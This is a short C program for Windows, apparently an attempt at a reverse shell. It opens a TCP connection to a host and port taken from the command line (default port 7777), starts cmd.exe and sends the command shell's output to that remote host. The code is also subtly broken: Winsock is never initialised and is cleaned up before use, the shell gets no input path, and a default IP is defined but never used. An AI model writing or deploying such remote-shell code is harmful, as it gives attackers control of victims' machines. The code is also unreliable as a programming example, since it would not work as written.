#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <winsock2.h>

#define DEFAULT_IP "192.168.56.104"
#define DEFAULT_PORT 7777


int main(int argc, char *argv[]) {
    if (argc == 1) {
        fprintf(stderr, "Usage: %s [host] [port]\n", argv[0]);
        return EXIT_FAILURE;
    }

    struct hostent *he;
    struct sockaddr_in addr;

    // Resolve target IP address
    he = gethostbyname(argv[1]);
    if (he == NULL) {
        perror("gethostbyname");
        return EXIT_FAILURE;
    }

    // Initialize socket settings
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("socket");
        return EXIT_FAILURE;
    }

    // Set up connection parameters
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((argc > 2) ? atoi(argv[2]) : DEFAULT_PORT);
    addr.sin_addr.s_addr = ((struct in_addr *) he->h_addr)->s_addr;

    // Connect to target
    int connect_result = connect(sockfd, (const struct sockaddr *) &addr, sizeof(addr));
    if (connect_result != 0) {
        perror("connect");
        closesocket(sockfd);
        return EXIT_FAILURE;
    }
    
    WSACleanup();

    FILE *fp = _popen("cmd.exe", "r");

    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        send(sockfd, buffer, strlen(buffer), 0);
    }

    fclose(fp);

    return EXIT_SUCCESS;
}